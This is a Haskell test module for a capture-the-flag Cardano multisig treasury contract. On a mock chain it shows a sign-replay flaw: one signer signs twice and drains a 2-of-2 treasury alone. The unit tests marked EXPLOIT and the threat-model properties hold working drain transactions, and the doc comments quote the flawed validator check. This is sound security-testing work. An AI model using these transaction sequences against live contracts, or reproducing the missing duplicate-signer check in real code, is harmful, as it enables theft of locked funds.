{-# LANGUAGE DeriveAnyClass #-}
{-# LANGUAGE DerivingStrategies #-}
{-# LANGUAGE LambdaCase #-}
{-# LANGUAGE NamedFieldPuns #-}
{-# LANGUAGE NumericUnderscores #-}
{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE TemplateHaskell #-}
{-# LANGUAGE TypeApplications #-}
{-# LANGUAGE TypeFamilies #-}
{-# LANGUAGE ViewPatterns #-}

{- | Tests for the Aiken-compiled CTF Multisig Treasury V3 validator using TestingInterface.

This module demonstrates property-based testing of a vulnerable multisig contract
with a validation token burning mechanism that is EXPLOITABLE via sign replay.

== Vulnerability: Sign Replay / Duplicate Signature ==

The v3 multisig fixes the token forgery by requiring the validation token to be
BURNED in the `Use` action. But it introduces a new vulnerability:

The `Sign` action adds a signer to `signed_users`, but **doesn't check if they've
already signed**. So the SAME person can sign multiple times, filling all the
signature slots. With a 2-of-3 multisig, one person can sign twice and then use
the funds.

@
Sign -> {
  // VULNERABILITY: Only checks signer is in required_signers
  // Does NOT check if they've already signed!
  // Allows same person to sign multiple times
  list.any(
    datum.required_signers,
    fn(signer) { list.has(self.extra_signatories, signer) },
  )
}
@

An attacker can:
1. Be one of the required_signers in a multisig setup
2. Submit Sign transaction multiple times, each time adding themselves to signed_users
3. Fill up the signature slots with their own key (bypassing actual multi-party signing)
4. Burn a validation token (which they can mint since they signed) and Use to drain

The Aiken types encode as:
- @Datum { release_value: Int, beneficiary: Address, required_signers: List<VerificationKeyHash>, signed_users: List<VerificationKeyHash> }@
- @Spend Redeemer: Sign | Use@ = @Constr 0 [] | Constr 1 []@
- @Mint Redeemer: MintValidation | BurnValidation@ = @Constr 0 [] | Constr 1 []@
-}
module AikenMultisigTreasuryV3Spec (
  -- * TestingInterface model
  MultisigV3Model (..),

  -- * Test tree
  aikenMultisigTreasuryV3Tests,

  -- * Standalone threat model tests
  propMultisigV3SignReplayExploit,
  propMultisigV3VulnerableToDuplicateListEntry,
) where

import Cardano.Api qualified as C
import Control.Lens ((^.))
import Control.Monad (void)
import Control.Monad.Except (MonadError, runExceptT)
import Control.Monad.IO.Class (MonadIO (..))
import Control.Monad.Trans (lift)
import Convex.Aiken.Blueprint (Blueprint (..))
import Convex.Aiken.Blueprint qualified as Blueprint
import Convex.BuildTx (MonadBuildTx, execBuildTx)
import Convex.BuildTx qualified as BuildTx
import Convex.Class (MonadMockchain, getUtxo)
import Convex.CoinSelection (BalanceTxError, ChangeOutputPosition (TrailingChange))
import Convex.MockChain (fromLedgerUTxO, runMockchain0IOWith)
import Convex.MockChain.CoinSelection (balanceAndSubmit, tryBalanceAndSubmit)
import Convex.MockChain.Defaults qualified as Defaults
import Convex.MockChain.Utils (mockchainSucceeds)
import Convex.NodeParams (ledgerProtocolParameters)
import Convex.PlutusLedger.V1 (transAddressInEra)
import Convex.TestingInterface (
  Options (Options, params),
  RunOptions (disableNegativeTesting, mcOptions),
  TestingInterface (..),
  propRunActionsWithOptions,
 )
import Convex.ThreatModel (ThreatModelEnv (..), runThreatModelM)
import Convex.ThreatModel.Cardano.Api (dummyTxId)

import Convex.ThreatModel.DuplicateListEntry (duplicateListEntryAttack)
import Convex.ThreatModel.UnprotectedScriptOutput (unprotectedScriptOutput)
import Convex.Utils (failOnError)
import Convex.Wallet (Wallet, addressInEra, verificationKeyHash)
import Convex.Wallet.MockWallet qualified as Wallet
import Data.Map qualified as Map
import Data.Maybe (mapMaybe)

import Paths_convex_testing_interface qualified as Pkg
import PlutusLedgerApi.V1 qualified as PV1
import PlutusTx qualified
import PlutusTx.Builtins qualified as PlutusTx

import System.IO.Unsafe (unsafePerformIO)
import Test.QuickCheck.Monadic (monadicIO, monitor, run)
import Test.Tasty (TestTree, testGroup)
import Test.Tasty.HUnit (assertFailure, testCase)
import Test.Tasty.QuickCheck (
  Property,
  counterexample,
  testProperty,
 )
import Test.Tasty.QuickCheck qualified as QC

-- ----------------------------------------------------------------------------
-- Multisig V3 Datum and Redeemer types (wire-compatible with Aiken)
-- ----------------------------------------------------------------------------

{- | The datum stored at the multisig_treasury_v3 script address.

Same structure as V1/V2:
@Constr 0 [release_value, beneficiary_address, required_signers_list, signed_users_list]@
-}
data MultisigV3Datum = MultisigV3Datum
  { mv3ReleaseValue :: Integer
  -- ^ Amount to release (in lovelace)
  , mv3Beneficiary :: PV1.Address
  -- ^ Plutus address of beneficiary
  , mv3RequiredSigners :: [PlutusTx.BuiltinByteString]
  -- ^ List of required signer pubkey hashes
  , mv3SignedUsers :: [PlutusTx.BuiltinByteString]
  -- ^ List of users who have signed so far
  }
  deriving stock (Eq, Show)

{- | Actions that can be performed on the multisig treasury spend validator.

Aiken encodes as: @Sign = Constr 0 []@, @Use = Constr 1 []@
-}
data MultisigV3SpendRedeemer = SignV3 | UseV3
  deriving stock (Eq, Show)

{- | Redeemers for the validation token minting policy.

Aiken encodes as: @MintValidation = Constr 0 []@, @BurnValidation = Constr 1 []@
-}
data ValidationMintRedeemerV3 = MintValidationV3 | BurnValidationV3
  deriving stock (Eq, Show)

-- Use TH for ToData/FromData/UnsafeFromData instances
PlutusTx.unstableMakeIsData ''MultisigV3Datum
PlutusTx.unstableMakeIsData ''MultisigV3SpendRedeemer
PlutusTx.unstableMakeIsData ''ValidationMintRedeemerV3

-- ----------------------------------------------------------------------------
-- Script loading
-- ----------------------------------------------------------------------------

-- | Load the Aiken "ctf_multisig_treasury_v3" spend validator from the embedded blueprint
loadMultisigV3SpendScript :: IO (C.PlutusScript C.PlutusScriptV3)
loadMultisigV3SpendScript = do
  path <- Pkg.getDataFileName "test/data/aiken-contracts-example.json"
  Blueprint{validators} <- Blueprint.loadFromFile path >>= either fail pure
  case Map.lookup "ctf_multisig_treasury_v3.ctf_multisig_treasury_v3.spend" validators of
    Just (C.ScriptInAnyLang (C.PlutusScriptLanguage C.PlutusScriptV3) (C.PlutusScript _ ps)) ->
      pure ps
    _ -> fail "ctf_multisig_treasury_v3.ctf_multisig_treasury_v3.spend not found in Aiken blueprint"

-- | Load the Aiken "ctf_multisig_treasury_v3" mint policy from the embedded blueprint
loadMultisigV3MintScript :: IO (C.PlutusScript C.PlutusScriptV3)
loadMultisigV3MintScript = do
  path <- Pkg.getDataFileName "test/data/aiken-contracts-example.json"
  Blueprint{validators} <- Blueprint.loadFromFile path >>= either fail pure
  case Map.lookup "ctf_multisig_treasury_v3.ctf_multisig_treasury_v3.mint" validators of
    Just (C.ScriptInAnyLang (C.PlutusScriptLanguage C.PlutusScriptV3) (C.PlutusScript _ ps)) ->
      pure ps
    _ -> fail "ctf_multisig_treasury_v3.ctf_multisig_treasury_v3.mint not found in Aiken blueprint"

{- | Top-level binding for the Aiken CTF Multisig Treasury V3 spend script.

We use 'unsafePerformIO' here because 'TestingInterface.initialState' is a
pure value (not a function), so we cannot pass the script in dynamically.
-}
{-# NOINLINE multisigV3SpendScript #-}
multisigV3SpendScript :: C.PlutusScript C.PlutusScriptV3
multisigV3SpendScript = unsafePerformIO loadMultisigV3SpendScript

{-# NOINLINE multisigV3MintScript #-}
multisigV3MintScript :: C.PlutusScript C.PlutusScriptV3
multisigV3MintScript = unsafePerformIO loadMultisigV3MintScript

-- | Helper to wrap PlutusScript as Script (for hashScript)
plutusScript :: C.PlutusScript C.PlutusScriptV3 -> C.Script C.PlutusScriptV3
plutusScript = C.PlutusScript C.PlutusScriptV3

-- | Hash of the multisig_treasury_v3 spend script
multisigV3SpendScriptHash :: C.ScriptHash
multisigV3SpendScriptHash = C.hashScript (plutusScript multisigV3SpendScript)

-- | Address of the multisig_treasury_v3 script on the default network
multisigV3Address :: C.AddressInEra C.ConwayEra
multisigV3Address =
  C.makeShelleyAddressInEra
    C.shelleyBasedEra
    Defaults.networkId
    (C.PaymentCredentialByScript multisigV3SpendScriptHash)
    C.NoStakeAddress

-- | Asset name for validation tokens: "validation"
validationTokenNameV3 :: C.AssetName
validationTokenNameV3 = C.UnsafeAssetName "validation"

-- ----------------------------------------------------------------------------
-- Helper to convert wallet pubkey hash to BuiltinByteString
-- ----------------------------------------------------------------------------

-- | Get wallet pubkey hash as BuiltinByteString
walletPkhBytes :: Wallet -> PlutusTx.BuiltinByteString
walletPkhBytes w = PlutusTx.toBuiltin $ C.serialiseToRawBytes (verificationKeyHash w)

-- | Get wallet Plutus address
walletPlutusAddress :: Wallet -> PV1.Address
walletPlutusAddress w =
  let addr = addressInEra @C.ConwayEra Defaults.networkId w
   in case transAddressInEra addr of
        Just a -> a
        Nothing -> error "Failed to convert wallet address to Plutus address"

-- ----------------------------------------------------------------------------
-- Transaction builders
-- ----------------------------------------------------------------------------

{- | Initialize the multisig treasury v3 by paying to the script with initial datum.

Creates a 2-of-2 multisig with w1 and w2 as required signers.
-}
initMultisigV3
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> Wallet
  -- ^ Beneficiary wallet
  -> C.Lovelace
  -- ^ Initial value to lock
  -> m ()
initMultisigV3 networkId beneficiary initialValue = do
  let beneficiaryAddr = walletPlutusAddress beneficiary
      -- 2-of-2 multisig: w1 and w2 must both sign
      requiredSigners = [walletPkhBytes Wallet.w1, walletPkhBytes Wallet.w2]
      datum =
        MultisigV3Datum
          { mv3ReleaseValue = 10_000_000 -- Release 10 ADA when fully signed
          , mv3Beneficiary = beneficiaryAddr
          , mv3RequiredSigners = requiredSigners
          , mv3SignedUsers = [] -- No one has signed yet
          }
  BuildTx.payToScriptInlineDatum
    networkId
    multisigV3SpendScriptHash
    datum
    C.NoStakeAddress
    (C.lovelaceToValue initialValue)

{- | Sign the multisig v3: spend the UTxO with Sign redeemer and create continuation.

This is the "correct" off-chain code that creates a proper continuation.
VULNERABILITY: The validator doesn't check if the signer already signed!
-}
signMultisigV3
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , C.HasScriptLanguageInEra C.PlutusScriptV3 era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> C.TxIn
  -- ^ The script UTxO to spend
  -> MultisigV3Datum
  -- ^ Current datum
  -> C.Value
  -- ^ Current value
  -> Wallet
  -- ^ The wallet signing
  -> m ()
signMultisigV3 networkId txIn oldDatum currentValue signer = do
  let signerPkh = walletPkhBytes signer
      signerPkhC = verificationKeyHash signer
      -- Add signer to signed_users list (even if already there!)
      newDatum =
        oldDatum
          { mv3SignedUsers = signerPkh : mv3SignedUsers oldDatum
          }
      witness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            multisigV3SpendScript
            (C.ScriptDatumForTxIn Nothing)
            SignV3
  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn witness
  BuildTx.addRequiredSignature signerPkhC
  -- Create continuation output with updated datum
  BuildTx.payToScriptInlineDatum
    networkId
    multisigV3SpendScriptHash
    newDatum
    C.NoStakeAddress
    currentValue

{- | Use the multisig v3 to release funds (requires BURNING the validation token).

This spends the script UTxO with Use redeemer AND burns a validation token.
For v3, the Use action requires the token to be BURNED (amount = -1).
-}
useMultisigV3
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , C.HasScriptLanguageInEra C.PlutusScriptV3 era
     , MonadBuildTx era m
     )
  => C.TxIn
  -- ^ The script UTxO to spend
  -> C.AddressInEra era
  -- ^ Beneficiary address
  -> C.Lovelace
  -- ^ Amount to release
  -> Wallet
  -- ^ Wallet providing the signature (must be in signed_users)
  -> m ()
useMultisigV3 txIn beneficiaryAddr releaseValue signer = do
  let signerPkhC = verificationKeyHash signer
      spendWitness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            multisigV3SpendScript
            (C.ScriptDatumForTxIn Nothing)
            UseV3
  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn spendWitness
  BuildTx.addRequiredSignature signerPkhC
  BuildTx.payToAddress beneficiaryAddr (C.lovelaceToValue releaseValue)
  -- BURN a validation token (required for Use to succeed in v3)
  BuildTx.mintPlutus multisigV3MintScript BurnValidationV3 validationTokenNameV3 (-1)

{- | Mint a validation token and create a separate ADA-only UTxO.

To avoid collateral issues where the change output contains both ADA and
the minted token (making it unusable as collateral), we explicitly create
a separate ADA-only output for the signer's wallet.

The minted token will go to one change output, and we create another
pure ADA output for collateral purposes.
-}
mintValidationTokenV3WithCollateral
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , C.HasScriptLanguageInEra C.PlutusScriptV3 era
     , MonadBuildTx era m
     )
  => C.AddressInEra era
  -- ^ Address for the ADA-only collateral output
  -> Wallet
  -- ^ Wallet providing the signature (required by minting policy)
  -> m ()
mintValidationTokenV3WithCollateral collateralAddr signer = do
  let signerPkhC = verificationKeyHash signer
  BuildTx.setScriptsValid
  BuildTx.addRequiredSignature signerPkhC
  BuildTx.mintPlutus multisigV3MintScript MintValidationV3 validationTokenNameV3 1
  -- Create an explicit ADA-only output for collateral (5 ADA should be enough)
  BuildTx.payToAddress collateralAddr (C.lovelaceToValue 5_000_000)

-- Note: Sign replay attack uses the same signMultisigV3 function - the vulnerability
-- is that the validator doesn't check for duplicate signers, so calling signMultisigV3
-- multiple times with the same signer works!

-- ----------------------------------------------------------------------------
-- Helper to find script UTxOs
-- ----------------------------------------------------------------------------

-- | Find all UTxOs at the multisig_treasury_v3 script address
findMultisigV3Utxos
  :: (MonadMockchain C.ConwayEra m)
  => m [(C.TxIn, C.Value, MultisigV3Datum)]
findMultisigV3Utxos = do
  utxoSet <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo
  let C.UTxO utxos = utxoSet
      scriptUtxos = Map.filter (\(C.TxOut addr _ _ _) -> addr == multisigV3Address) utxos
  pure $ mapMaybe extractData $ Map.toList scriptUtxos
 where
  extractData (txIn, C.TxOut _ txOutValue datum _) =
    case txOutValue of
      C.TxOutValueShelleyBased _ val ->
        let value = C.fromMaryValue val
            d = case datum of
              C.TxOutDatumInline _ scriptData ->
                PlutusTx.unsafeFromBuiltinData @MultisigV3Datum
                  (PlutusTx.dataToBuiltinData $ C.toPlutusData $ C.getScriptData scriptData)
              _ -> error "Expected inline datum"
         in Just (txIn, value, d)
      C.TxOutValueByron _ -> Nothing

-- ----------------------------------------------------------------------------
-- Unit tests
-- ----------------------------------------------------------------------------

aikenMultisigV3UnitTests :: TestTree
aikenMultisigV3UnitTests =
  testGroup
    "ctf multisig_treasury_v3 unit tests"
    [ testCase "initialize multisig v3" $
        mockchainSucceeds $
          failOnError $ do
            let txBody = execBuildTx $ initMultisigV3 @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
            void $ tryBalanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
            -- Verify UTxO exists at script address
            result <- findMultisigV3Utxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((_, _, datum) : _) -> do
                liftIO $
                  if length (mv3RequiredSigners datum) == 2 && null (mv3SignedUsers datum)
                    then pure ()
                    else assertFailure $ "Wrong datum state: " ++ show datum
    , testCase "normal flow: init -> sign(w1) -> sign(w2) -> mint token -> use with token burn" $
        mockchainSucceeds $
          failOnError $ do
            -- Initialize multisig with w1 as beneficiary
            let initTxBody = execBuildTx $ initMultisigV3 @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

            -- Sign with w1
            result1 <- findMultisigV3Utxos
            case result1 of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn1, value1, datum1) : _) -> do
                let sign1TxBody = execBuildTx $ signMultisigV3 @C.ConwayEra Defaults.networkId txIn1 datum1 value1 Wallet.w1
                _ <- tryBalanceAndSubmit mempty Wallet.w1 sign1TxBody TrailingChange []

                -- Sign with w2
                result2 <- findMultisigV3Utxos
                case result2 of
                  [] -> liftIO $ assertFailure "Expected UTxO after first sign"
                  ((txIn2, value2, datum2) : _) -> do
                    -- Verify w1 is now in signed_users
                    liftIO $
                      if length (mv3SignedUsers datum2) == 1
                        then pure ()
                        else assertFailure $ "Expected 1 signed user, got: " ++ show (mv3SignedUsers datum2)

                    let sign2TxBody = execBuildTx $ signMultisigV3 @C.ConwayEra Defaults.networkId txIn2 datum2 value2 Wallet.w2
                    _ <- tryBalanceAndSubmit mempty Wallet.w2 sign2TxBody TrailingChange []

                    -- Mint a validation token, creating a separate ADA-only output for collateral
                    let w1Addr = addressInEra Defaults.networkId Wallet.w1
                        mintTxBody = execBuildTx $ mintValidationTokenV3WithCollateral @C.ConwayEra w1Addr Wallet.w1
                    _ <- tryBalanceAndSubmit mempty Wallet.w1 mintTxBody TrailingChange []

                    -- Use the multisig (with validation token BURN)
                    result3 <- findMultisigV3Utxos
                    case result3 of
                      [] -> liftIO $ assertFailure "Expected UTxO after second sign"
                      ((txIn3, _, datum3) : _) -> do
                        -- Verify both are in signed_users
                        liftIO $
                          if length (mv3SignedUsers datum3) == 2
                            then pure ()
                            else assertFailure $ "Expected 2 signed users, got: " ++ show (mv3SignedUsers datum3)

                        let beneficiaryAddr = addressInEra Defaults.networkId Wallet.w1
                            useTxBody = execBuildTx $ useMultisigV3 @C.ConwayEra txIn3 beneficiaryAddr 10_000_000 Wallet.w1
                        void $ tryBalanceAndSubmit mempty Wallet.w1 useTxBody TrailingChange []

                        -- Verify UTxO is gone
                        result4 <- findMultisigV3Utxos
                        case result4 of
                          [] -> pure ()
                          _ -> liftIO $ assertFailure "Expected no UTxO after use"
    , testCase "EXPLOIT: Sign replay - w1 signs TWICE and drains treasury alone" $
        -- This demonstrates the SIGN REPLAY vulnerability!
        -- w1 signs twice, filling both signature slots, then drains the treasury
        -- without w2 ever signing.
        mockchainSucceeds $
          failOnError $ do
            -- Step 1: Initialize multisig (2-of-2 with w1 and w2)
            let initTxBody = execBuildTx $ initMultisigV3 @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

            -- Step 2: w1 signs FIRST time
            result1 <- findMultisigV3Utxos
            case result1 of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn1, value1, datum1) : _) -> do
                let sign1TxBody = execBuildTx $ signMultisigV3 @C.ConwayEra Defaults.networkId txIn1 datum1 value1 Wallet.w1
                _ <- tryBalanceAndSubmit mempty Wallet.w1 sign1TxBody TrailingChange []

                -- Step 3: w1 signs SECOND time (same signer, different tx)
                -- This should NOT be allowed, but the validator doesn't check!
                result2 <- findMultisigV3Utxos
                case result2 of
                  [] -> liftIO $ assertFailure "Expected UTxO after first sign"
                  ((txIn2, value2, datum2) : _) -> do
                    -- Verify w1 is in signed_users once
                    liftIO $
                      if length (mv3SignedUsers datum2) == 1
                        then pure ()
                        else assertFailure $ "Expected 1 signed user, got: " ++ show (mv3SignedUsers datum2)

                    -- w1 signs AGAIN - vulnerability!
                    let sign2TxBody = execBuildTx $ signMultisigV3 @C.ConwayEra Defaults.networkId txIn2 datum2 value2 Wallet.w1
                    _ <- tryBalanceAndSubmit mempty Wallet.w1 sign2TxBody TrailingChange []

                    -- Step 4: Verify w1 is now in signed_users TWICE
                    result3 <- findMultisigV3Utxos
                    case result3 of
                      [] -> liftIO $ assertFailure "Expected UTxO after second sign"
                      ((txIn3, _, datum3) : _) -> do
                        liftIO $
                          if length (mv3SignedUsers datum3) == 2
                            then pure () -- Both slots filled by w1!
                            else assertFailure $ "Expected 2 signed users (both w1), got: " ++ show (mv3SignedUsers datum3)

                        -- Step 5: Mint a validation token (with collateral output)
                        let w1Addr = addressInEra Defaults.networkId Wallet.w1
                            mintTxBody = execBuildTx $ mintValidationTokenV3WithCollateral @C.ConwayEra w1Addr Wallet.w1
                        _ <- tryBalanceAndSubmit mempty Wallet.w1 mintTxBody TrailingChange []

                        -- Step 6: w1 uses the multisig (drains it!)
                        -- w2 NEVER signed, but w1 filled both slots
                        let beneficiaryAddr = addressInEra Defaults.networkId Wallet.w1
                            useTxBody = execBuildTx $ useMultisigV3 @C.ConwayEra txIn3 beneficiaryAddr 10_000_000 Wallet.w1
                        void $ tryBalanceAndSubmit mempty Wallet.w1 useTxBody TrailingChange []

                        -- Step 7: Verify exploit succeeded - UTxO drained
                        result4 <- findMultisigV3Utxos
                        case result4 of
                          [] -> pure () -- Exploit succeeded!
                          _ -> liftIO $ assertFailure "Expected UTxO to be drained (exploit should have succeeded)"
    , testCase "exploit: 1-of-N signature vulnerability (inherited from v1/v2)" $
        -- V3 still has the same 1-of-N vulnerability as V1/V2
        mockchainSucceeds $
          failOnError $ do
            -- Create UTxO with w1 in signed_users
            let beneficiaryAddr = walletPlutusAddress Wallet.w1
                datum =
                  MultisigV3Datum
                    { mv3ReleaseValue = 10_000_000
                    , mv3Beneficiary = beneficiaryAddr
                    , mv3RequiredSigners = [walletPkhBytes Wallet.w1, walletPkhBytes Wallet.w2]
                    , mv3SignedUsers = [walletPkhBytes Wallet.w1] -- Only w1 has "signed"
                    }
                initTxBody =
                  execBuildTx $
                    BuildTx.payToScriptInlineDatum
                      Defaults.networkId
                      multisigV3SpendScriptHash
                      datum
                      C.NoStakeAddress
                      (C.lovelaceToValue 20_000_000)
            _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

            -- Mint a validation token (with collateral output)
            let w1Addr = addressInEra Defaults.networkId Wallet.w1
                mintTxBody = execBuildTx $ mintValidationTokenV3WithCollateral @C.ConwayEra w1Addr Wallet.w1
            _ <- tryBalanceAndSubmit mempty Wallet.w1 mintTxBody TrailingChange []

            -- Try to Use with only w1 signing (w2 never signed!)
            result <- findMultisigV3Utxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn, _, _) : _) -> do
                let beneficiaryAddrC = addressInEra Defaults.networkId Wallet.w1
                    useTxBody = execBuildTx $ useMultisigV3 @C.ConwayEra txIn beneficiaryAddrC 10_000_000 Wallet.w1
                -- This succeeds even though w2 never signed!
                void $ tryBalanceAndSubmit mempty Wallet.w1 useTxBody TrailingChange []

                -- Verify UTxO is gone (exploit succeeded!)
                result2 <- findMultisigV3Utxos
                case result2 of
                  [] -> pure () -- Exploit worked!
                  _ -> liftIO $ assertFailure "Exploit should have succeeded"
    ]

-- ----------------------------------------------------------------------------
-- Standalone Threat Model Tests
-- ----------------------------------------------------------------------------

{- | Test that the multisig v3 contract is vulnerable to sign replay.

This demonstrates the core vulnerability: the Sign action doesn't check
if the signer has already signed. A single signer can fill all signature
slots by signing multiple times.

The test:
1. Initialize 2-of-2 multisig with w1 and w2 as required signers
2. w1 signs TWICE (filling both slots)
3. w1 mints validation token and uses to drain

This test returns True when the vulnerability is confirmed.
-}
propMultisigV3SignReplayExploit :: RunOptions -> Property
propMultisigV3SignReplayExploit opts = monadicIO $ do
  let Options{params} = mcOptions opts

  result <- run $ runMockchain0IOWith Wallet.initialUTxOs params $ runExceptT $ do
    -- Initialize 2-of-2 multisig
    let initTxBody = execBuildTx $ initMultisigV3 @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
    _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

    -- w1 signs first time
    result1 <- findMultisigV3Utxos
    case result1 of
      [] -> fail "Expected UTxO at script address"
      ((txIn1, value1, datum1) : _) -> do
        let sign1TxBody = execBuildTx $ signMultisigV3 @C.ConwayEra Defaults.networkId txIn1 datum1 value1 Wallet.w1
        _ <- tryBalanceAndSubmit mempty Wallet.w1 sign1TxBody TrailingChange []

        -- w1 signs SECOND time (exploit!)
        result2 <- findMultisigV3Utxos
        case result2 of
          [] -> fail "Expected UTxO after first sign"
          ((txIn2, value2, datum2) : _) -> do
            let sign2TxBody = execBuildTx $ signMultisigV3 @C.ConwayEra Defaults.networkId txIn2 datum2 value2 Wallet.w1
            _ <- tryBalanceAndSubmit mempty Wallet.w1 sign2TxBody TrailingChange []

            -- Mint validation token (with collateral output)
            let w1Addr = addressInEra Defaults.networkId Wallet.w1
                mintTxBody = execBuildTx $ mintValidationTokenV3WithCollateral @C.ConwayEra w1Addr Wallet.w1
            _ <- tryBalanceAndSubmit mempty Wallet.w1 mintTxBody TrailingChange []

            -- Capture UTxO before exploit
            utxoBefore <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo

            -- w1 drains using burned token
            result3 <- findMultisigV3Utxos
            case result3 of
              [] -> fail "Expected UTxO after signing"
              ((txIn3, _, _) : _) -> do
                let beneficiaryAddr = addressInEra Defaults.networkId Wallet.w1
                    useTxBody = execBuildTx $ useMultisigV3 @C.ConwayEra txIn3 beneficiaryAddr 10_000_000 Wallet.w1
                exploitTx <- tryBalanceAndSubmit mempty Wallet.w1 useTxBody TrailingChange []
                pure (exploitTx, utxoBefore)

  case result of
    (Left err, _) -> do
      monitor (counterexample $ "Mockchain error: " ++ show err)
      -- If the transaction FAILED, then the script is NOT vulnerable (which would be good!)
      pure $ QC.property False
    (Right (_, _), _finalState) -> do
      monitor (counterexample "Testing multisig v3 for sign replay vulnerability")
      -- The exploit SUCCEEDED - vulnerability confirmed!
      pure $ QC.property True

{- | Run a scenario for threat model testing with continuation output.

This creates a proper Sign transaction that has a continuation output.
-}
multisigV3ContinuationScenario
  :: ( MonadMockchain C.ConwayEra m
     , MonadError (BalanceTxError C.ConwayEra) m
     , MonadFail m
     )
  => m (C.Tx C.ConwayEra, C.UTxO C.ConwayEra)
multisigV3ContinuationScenario = do
  -- Initialize multisig
  let initTxBody = execBuildTx $ initMultisigV3 @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
  _ <- tryBalanceAndSubmit mempty Wallet.w1 initTxBody TrailingChange []

  -- Capture UTxO BEFORE signing (for threat model)
  utxoBefore <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo

  -- Sign with w1 (creating continuation)
  result <- findMultisigV3Utxos
  case result of
    [] -> fail "Expected UTxO at script address"
    ((txIn, value, datum) : _) -> do
      let signTxBody = execBuildTx $ signMultisigV3 @C.ConwayEra Defaults.networkId txIn datum value Wallet.w1
      signTx <- tryBalanceAndSubmit mempty Wallet.w1 signTxBody TrailingChange []
      pure (signTx, utxoBefore)

{- | Test unprotectedScriptOutput threat model on the multisig v3.

The Sign action creates a continuation output.
-}
propMultisigV3UnprotectedOutput :: RunOptions -> Property
propMultisigV3UnprotectedOutput opts = QC.expectFailure $ monadicIO $ do
  let Options{params} = mcOptions opts

  result <- run $ runMockchain0IOWith Wallet.initialUTxOs params $ runExceptT $ do
    (tx, utxo) <- multisigV3ContinuationScenario

    let pparams' = params ^. ledgerProtocolParameters
        env =
          ThreatModelEnv
            { currentTx = tx
            , currentUTxOs = utxo
            , pparams = pparams'
            }

    -- Run the threat model INSIDE MockchainT with full Phase 1 + Phase 2 validation
    lift $ runThreatModelM Wallet.w1 unprotectedScriptOutput [env]

  case result of
    (Left err, _) -> do
      monitor (counterexample $ "Mockchain error: " ++ show err)
      pure $ QC.property False
    (Right prop, _finalState) -> do
      monitor (counterexample "Testing multisig v3 for unprotected script output vulnerability")
      pure prop

{- | Test that the multisig v3 contract is vulnerable to duplicate list entry attack.

The Sign action creates a continuation output with @signed_users = [signer_pkh]@.
The validator doesn't check for duplicate entries in this list.

An attacker can:
1. Intercept a valid Sign transaction
2. Duplicate the first entry in @signed_users@ to fill multiple signature slots
3. The validator only checks length, not uniqueness

This test uses expectFailure because the vulnerability SHOULD be detected
(the modified transaction should NOT validate, but it does).
-}
propMultisigV3VulnerableToDuplicateListEntry :: RunOptions -> Property
propMultisigV3VulnerableToDuplicateListEntry opts = QC.expectFailure $ monadicIO $ do
  let Options{params} = mcOptions opts

  result <- run $ runMockchain0IOWith Wallet.initialUTxOs params $ runExceptT $ do
    -- Create a Sign transaction (w1 signs, creating continuation with signed_users = [w1_pkh])
    (tx, utxo) <- multisigV3ContinuationScenario

    let pparams' = params ^. ledgerProtocolParameters
        env =
          ThreatModelEnv
            { currentTx = tx
            , currentUTxOs = utxo
            , pparams = pparams'
            }

    -- Run the duplicate list entry threat model
    -- This will try to duplicate the first entry in signed_users
    -- If the validator is vulnerable, the modified tx will still validate
    lift $ runThreatModelM Wallet.w1 duplicateListEntryAttack [env]

  case result of
    (Left err, _) -> do
      monitor (counterexample $ "Mockchain error: " ++ show err)
      pure $ QC.property False
    (Right prop, _finalState) -> do
      monitor (counterexample "Testing multisig v3 for duplicate list entry vulnerability")
      pure prop

-- ----------------------------------------------------------------------------
-- TestingInterface instance
-- ----------------------------------------------------------------------------

-- | Model state for the CTF Multisig Treasury V3 contract
data MultisigV3Model = MultisigV3Model
  { mmv3Initialized :: Bool
  -- ^ Whether the multisig has been created
  , mmv3TxIn :: Maybe C.TxIn
  -- ^ The UTxO at the script
  , mmv3Value :: C.Lovelace
  -- ^ Value locked in the multisig
  , mmv3RequiredSigners :: [PlutusTx.BuiltinByteString]
  -- ^ List of required signers
  , mmv3SignedUsers :: [PlutusTx.BuiltinByteString]
  -- ^ List of users who have signed (may contain duplicates!)
  , mmv3Beneficiary :: Maybe PV1.Address
  -- ^ Beneficiary address
  , mmv3ReleaseValue :: Integer
  -- ^ Amount to release
  , mmv3HasBeenUsed :: Bool
  -- ^ Once used, sequence is done
  , mmv3HasValidationToken :: Bool
  -- ^ Whether we've minted a validation token
  }
  deriving stock (Show, Eq)

-- | Which signer to use (w1 or w2)
data SignerChoice = Signer1 | Signer2
  deriving stock (Show, Eq)

signerToWallet :: SignerChoice -> Wallet
signerToWallet Signer1 = Wallet.w1
signerToWallet Signer2 = Wallet.w2

instance TestingInterface MultisigV3Model where
  -- Actions for Multisig V3
  data Action MultisigV3Model
    = InitMultisigV3
    | -- \^ Initialize the multisig (2-of-2 with w1, w2)
      SignMultisigV3 SignerChoice
    | -- \^ Sign with a wallet (can sign multiple times - vulnerability!)
      MintValidationToken
